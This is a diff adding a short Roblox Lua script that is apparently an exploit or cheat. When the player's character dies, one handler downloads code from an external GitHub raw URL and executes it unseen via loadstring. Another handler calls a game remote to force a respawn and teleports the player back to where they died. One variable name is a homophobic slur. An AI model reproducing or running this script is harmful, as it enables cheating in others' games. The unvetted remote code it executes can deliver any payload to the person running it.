@@ -1,0 +1,11 @@
+game.Players.LocalPlayer.Character:WaitForChild("Humanoid").Died:Connect(function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vinciuszk70/vinciuszk70/main/joins"))()
+end)
+
+game.Players.LocalPlayer.Character:WaitForChild("Humanoid").Died:Connect(function()
+local lastPos = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").position
+local plr = game.Players.LocalPlayer.Name
+local gayevent = game:GetService("Workspace").Remote.loadchar
+gayevent:InvokeServer(plr)
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(lastPos)
+end)
